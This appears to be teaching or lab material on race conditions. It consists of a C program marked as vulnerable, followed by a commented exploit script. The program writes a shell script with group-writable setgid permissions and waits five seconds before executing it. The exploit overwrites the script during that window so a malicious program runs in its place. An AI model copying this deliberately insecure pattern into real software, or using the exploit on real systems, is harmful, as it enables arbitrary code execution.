// program.c (vulnerable)
#include <fcntl.h>
#include <limits.h>
#include <pwd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>

int main(int argc, char *argv[]) {
    char buffer[1024], path[PATH_MAX + 1];
    int fd, i;

    strcpy(path, getpwuid(getuid()) -> pw_dir);
    strcat(path, "/script.sh");

    strcpy(buffer, "#!/bin/bash\necho Hello.\ndate\nrm \"$0\"\n");

    umask(0);
    if ((fd = open(path, O_CREAT | O_EXCL | O_WRONLY, 02760)) < 0) {
        perror("open");
        return 1;
    }
    write(fd, buffer, strlen(buffer));
    close(fd);

    printf("Please wait for us to run your script...");
    fflush(stdout);
    for (i = 0; i < 5; i++) {
        printf(".");
        fflush(stdout);
        sleep(1);
    }
    printf(" starting script.\n");

    execl("/bin/sh", "/bin/sh", path, (char *) 0);
    perror("execl");
    return 0;
}

// exploit.sh
// #!/bin/bash
// /path/to/program &
// sleep 1
// echo "/path/to/malicious/program" > "script.sh" &
// wait
